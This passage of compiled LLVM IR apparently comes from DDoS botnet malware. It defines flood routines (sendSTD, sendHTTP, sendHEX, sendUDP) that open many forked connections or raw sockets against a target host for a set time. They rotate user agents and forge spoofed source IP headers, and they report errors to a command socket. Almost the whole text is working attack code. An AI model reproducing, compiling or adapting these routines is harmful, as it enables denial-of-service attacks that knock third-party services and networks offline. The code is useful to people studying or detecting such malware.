  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #2
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %66, %3
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  br i1 %47, label %48, label %66

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 50, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = sext i32 %55 to i64
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = add nsw i64 %57, %59
  %61 = icmp sge i64 %56, %60
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %48
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #12
  unreachable

; <label>:65:                                     ; preds = %48
  store i32 0, i32* %11, align 4
  br label %66

; <label>:66:                                     ; preds = %65, %39
  %67 = load i32, i32* %11, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  ret void
}

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [1 x i8], align 1
  %11 = alloca [512 x i8], align 16
  %12 = alloca [3 x i8*], align 16
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %9, align 8
  %17 = bitcast [3 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %17, i8* bitcast ([3 x i8*]* @sendHTTP.methods to i8*), i64 24, i32 16, i1 false)
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i32 @getdtablesize() #2
  %20 = sdiv i32 %19, 2
  store i32 %20, i32* %14, align 4
  store i32 0, i32* %7, align 4
  br label %21

; <label>:21:                                     ; preds = %116, %3
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %14, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %119

; <label>:25:                                     ; preds = %21
  %26 = call i32 @fork() #2
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %115

; <label>:28:                                     ; preds = %25
  br label %29

; <label>:29:                                     ; preds = %114, %28
  %30 = load i8*, i8** %4, align 8
  %31 = load i32, i32* %5, align 4
  %32 = trunc i32 %31 to i16
  %33 = call i32 @socket_connect(i8* %30, i16 zeroext %32)
  store i32 %33, i32* %8, align 4
  %34 = load i32, i32* %8, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %105

; <label>:36:                                     ; preds = %29
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %38 = call i8* @strcpy(i8* %37, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0)) #2
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %41 = call i64 @strlen(i8* %40) #10
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = call i32 @rand() #2
  %44 = sext i32 %43 to i64
  %45 = urem i64 %44, 3
  %46 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 %45
  %47 = load i8*, i8** %46, align 8
  %48 = call i8* @strcpy(i8* %42, i8* %47) #2
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %51 = call i64 @strlen(i8* %50) #10
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = call i8* @strcpy(i8* %52, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.81, i32 0, i32 0)) #2
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %56 = call i64 @strlen(i8* %55) #10
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = load i8*, i8** %4, align 8
  %59 = call i8* @strcpy(i8* %57, i8* %58) #2
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %62 = call i64 @strlen(i8* %61) #10
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = call i8* @strcpy(i8* %63, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.82, i32 0, i32 0)) #2
  %65 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %66 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %67 = call i64 @strlen(i8* %66) #10
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i32 @rand() #2
  %70 = sext i32 %69 to i64
  %71 = urem i64 %70, 32
  %72 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %71
  %73 = load i8*, i8** %72, align 8
  %74 = call i8* @strcpy(i8* %68, i8* %73) #2
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %77 = call i64 @strlen(i8* %76) #10
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = call i8* @strcpy(i8* %78, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.83, i32 0, i32 0)) #2
  %80 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %81 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %82 = call i64 @strlen(i8* %81) #10
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = call i32 @rand() #2
  %85 = sext i32 %84 to i64
  %86 = urem i64 %85, 3
  %87 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = call i8* @strcpy(i8* %83, i8* %88) #2
  %90 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %92 = call i64 @strlen(i8* %91) #10
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = call i8* @strcpy(i8* %93, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.84, i32 0, i32 0)) #2
  %95 = load i32, i32* %8, align 4
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %98 = call i64 @strlen(i8* %97) #10
  %99 = call i64 @write(i32 %95, i8* %96, i64 %98)
  %100 = load i32, i32* %8, align 4
  %101 = getelementptr inbounds [1 x i8], [1 x i8]* %10, i32 0, i32 0
  %102 = call i64 @read(i32 %100, i8* %101, i64 1)
  %103 = load i32, i32* %8, align 4
  %104 = call i32 @close(i32 %103)
  br label %105

; <label>:105:                                    ; preds = %36, %29
  %106 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %9, align 8
  %109 = load i32, i32* %6, align 4
  %110 = sext i32 %109 to i64
  %111 = add nsw i64 %108, %110
  %112 = icmp sge i64 %107, %111
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %105
  call void @_exit(i32 0) #12
  unreachable

; <label>:114:                                    ; preds = %105
  br label %29

; <label>:115:                                    ; preds = %25
  br label %116

; <label>:116:                                    ; preds = %115
  %117 = load i32, i32* %7, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %7, align 4
  br label %21

; <label>:119:                                    ; preds = %21
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHEX(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %21 = load i32, i32* %11, align 4
  %22 = add nsw i32 %20, %21
  store i32 %22, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %24 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.85, i32 0, i32 0))
  store i32 0, i32* %14, align 4
  br label %25

; <label>:25:                                     ; preds = %67, %6
  %26 = load i32, i32* %14, align 4
  %27 = load i32, i32* %12, align 4
  %28 = icmp slt i32 %26, %27
  br i1 %28, label %29, label %70

; <label>:29:                                     ; preds = %25
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %31 = load i8*, i8** %7, align 8
  %32 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %33 = load i8*, i8** %8, align 8
  %34 = call i32 @rand() #2
  %35 = srem i32 %34, 36
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.86, i32 0, i32 0), i8* %31, i8* %32, i8* %33, i8* %38)
  %40 = call i32 @fork() #2
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %66

; <label>:42:                                     ; preds = %29
  br label %43

; <label>:43:                                     ; preds = %64, %42
  %44 = load i32, i32* %15, align 4
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = icmp sgt i32 %44, %45
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* %48, i16 zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %64

; <label>:53:                                     ; preds = %47
  %54 = load i32, i32* %13, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = call i64 @strlen(i8* %56) #10
  %58 = call i64 @write(i32 %54, i8* %55, i64 %57)
  %59 = load i32, i32* %13, align 4
  %60 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %61 = call i64 @read(i32 %59, i8* %60, i64 1)
  %62 = load i32, i32* %13, align 4
  %63 = call i32 @close(i32 %62)
  br label %64

; <label>:64:                                     ; preds = %53, %47
  br label %43

; <label>:65:                                     ; preds = %43
  call void @exit(i32 0) #14
  unreachable

; <label>:66:                                     ; preds = %29
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %14, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %14, align 4
  br label %25

; <label>:70:                                     ; preds = %25
  ret void
}

declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %46

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* %10, align 4
  %43 = trunc i32 %42 to i16
  %44 = call zeroext i16 @htons(i16 zeroext %43) #13
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  br label %46

; <label>:46:                                     ; preds = %41, %37
  %47 = load i8*, i8** %9, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %295

; <label>:52:                                     ; preds = %46
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %14, align 4
  store i32 %55, i32* %18, align 4
  %56 = load i32, i32* %12, align 4
  %57 = icmp eq i32 %56, 32
  br i1 %57, label %58, label %120

; <label>:58:                                     ; preds = %52
  %59 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %59, i32* %19, align 4
  %60 = load i32, i32* %19, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %65, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* @mainCommSock, align 4
  %64 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  br label %295

; <label>:65:                                     ; preds = %58
  %66 = load i32, i32* %13, align 4
  %67 = add nsw i32 %66, 1
  %68 = sext i32 %67 to i64
  %69 = call noalias i8* @malloc(i64 %68) #2
  store i8* %69, i8** %20, align 8
  %70 = load i8*, i8** %20, align 8
  %71 = icmp eq i8* %70, null
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %65
  br label %295

; <label>:73:                                     ; preds = %65
  %74 = load i8*, i8** %20, align 8
  %75 = load i32, i32* %13, align 4
  %76 = add nsw i32 %75, 1
  %77 = sext i32 %76 to i64
  call void @llvm.memset.p0i8.i64(i8* %74, i8 0, i64 %77, i32 1, i1 false)
  %78 = load i8*, i8** %20, align 8
  %79 = load i32, i32* %13, align 4
  call void @RandString(i8* %78, i32 %79)
  %80 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %81 = load i32, i32* %11, align 4
  %82 = add nsw i32 %80, %81
  store i32 %82, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %83

; <label>:83:                                     ; preds = %116, %112, %105, %73
  %84 = load i32, i32* %19, align 4
  %85 = load i8*, i8** %20, align 8
  %86 = load i32, i32* %13, align 4
  %87 = sext i32 %86 to i64
  %88 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %89 = call i64 @sendto(i32 %84, i8* %85, i64 %87, i32 0, %struct.sockaddr* %88, i32 16)
  %90 = load i32, i32* %22, align 4
  %91 = load i32, i32* %18, align 4
  %92 = icmp eq i32 %90, %91
  br i1 %92, label %93, label %106

; <label>:93:                                     ; preds = %83
  %94 = load i32, i32* %10, align 4
  %95 = icmp eq i32 %94, 0
  br i1 %95, label %96, label %100

; <label>:96:                                     ; preds = %93
  %97 = call i32 @rand_cmwc()
  %98 = trunc i32 %97 to i16
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %98, i16* %99, align 2
  br label %100

; <label>:100:                                    ; preds = %96, %93
  %101 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %102 = load i32, i32* %21, align 4
  %103 = icmp sgt i32 %101, %102
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %119

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %22, align 4
  br label %83

; <label>:106:                                    ; preds = %83
  %107 = load i32, i32* %22, align 4
  %108 = add i32 %107, 1
  store i32 %108, i32* %22, align 4
  %109 = load i32, i32* %23, align 4
  %110 = load i32, i32* %15, align 4
  %111 = icmp eq i32 %109, %110
  br i1 %111, label %112, label %116

; <label>:112:                                    ; preds = %106
  %113 = load i32, i32* %16, align 4
  %114 = mul nsw i32 %113, 1000
  %115 = call i32 @usleep(i32 %114)
  store i32 0, i32* %23, align 4
  br label %83

; <label>:116:                                    ; preds = %106
  %117 = load i32, i32* %23, align 4
  %118 = add i32 %117, 1
  store i32 %118, i32* %23, align 4
  br label %83

; <label>:119:                                    ; preds = %104
  br label %295

; <label>:120:                                    ; preds = %52
  %121 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %121, i32* %24, align 4
  %122 = load i32, i32* %24, align 4
  %123 = icmp ne i32 %122, 0
  br i1 %123, label %127, label %124

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* @mainCommSock, align 4
  %126 = call i32 (i32, i8*, ...) @sockprintf(i32 %125, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  br label %295

; <label>:127:                                    ; preds = %120
  store i32 1, i32* %25, align 4
  %128 = load i32, i32* %24, align 4
  %129 = bitcast i32* %25 to i8*
  %130 = call i32 @setsockopt(i32 %128, i32 0, i32 3, i8* %129, i32 4) #2
  %131 = icmp slt i32 %130, 0
  br i1 %131, label %132, label %135

; <label>:132:                                    ; preds = %127
  %133 = load i32, i32* @mainCommSock, align 4
  %134 = call i32 (i32, i8*, ...) @sockprintf(i32 %133, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i32 0, i32 0))
  br label %295

; <label>:135:                                    ; preds = %127
  store i32 50, i32* %26, align 4
  br label %136

; <label>:136:                                    ; preds = %140, %135
  %137 = load i32, i32* %26, align 4
  %138 = add nsw i32 %137, -1
  store i32 %138, i32* %26, align 4
  %139 = icmp ne i32 %137, 0
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %136
  %141 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %142 = call i32 @rand_cmwc()
  %143 = xor i32 %141, %142
  call void @srand(i32 %143) #2
  %144 = call i32 @rand() #2
  call void @init_rand(i32 %144)
  br label %136

; <label>:145:                                    ; preds = %136
  %146 = load i32, i32* %12, align 4
  %147 = icmp eq i32 %146, 0
  br i1 %147, label %148, label %149

; <label>:148:                                    ; preds = %145
  store i32 0, i32* %27, align 4
  br label %155

; <label>:149:                                    ; preds = %145
  %150 = load i32, i32* %12, align 4
  %151 = sub nsw i32 32, %150
  %152 = shl i32 1, %151
  %153 = sub nsw i32 %152, 1
  %154 = xor i32 %153, -1
  store i32 %154, i32* %27, align 4
  br label %155

; <label>:155:                                    ; preds = %149, %148
  %156 = load i32, i32* %13, align 4
  %157 = sext i32 %156 to i64
  %158 = add i64 28, %157
  %159 = call i8* @llvm.stacksave()
  store i8* %159, i8** %28, align 8
  %160 = alloca i8, i64 %158, align 16
  %161 = bitcast i8* %160 to %struct.iphdr*
  store %struct.iphdr* %161, %struct.iphdr** %29, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = bitcast %struct.iphdr* %162 to i8*
  %164 = getelementptr i8, i8* %163, i64 20
  %165 = bitcast i8* %164 to %struct.udphdr*
  store %struct.udphdr* %165, %struct.udphdr** %30, align 8
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %168 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %167, i32 0, i32 0
  %169 = load i32, i32* %168, align 4
  %170 = load i32, i32* %27, align 4
  %171 = call i32 @GetRandomIP(i32 %170)
  %172 = call i32 @htonl(i32 %171) #13
  %173 = load i32, i32* %13, align 4
  %174 = sext i32 %173 to i64
  %175 = add i64 8, %174
  %176 = trunc i64 %175 to i32
  call void @makeIPPacket(%struct.iphdr* %166, i32 %169, i32 %172, i8 zeroext 17, i32 %176)
  %177 = load i32, i32* %13, align 4
  %178 = sext i32 %177 to i64
  %179 = add i64 8, %178
  %180 = trunc i64 %179 to i16
  %181 = call zeroext i16 @htons(i16 zeroext %180) #13
  %182 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %183 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.2* %183 to %struct.anon.3*
  %185 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %184, i32 0, i32 2
  store i16 %181, i16* %185, align 2
  %186 = call i32 @rand_cmwc()
  %187 = trunc i32 %186 to i16
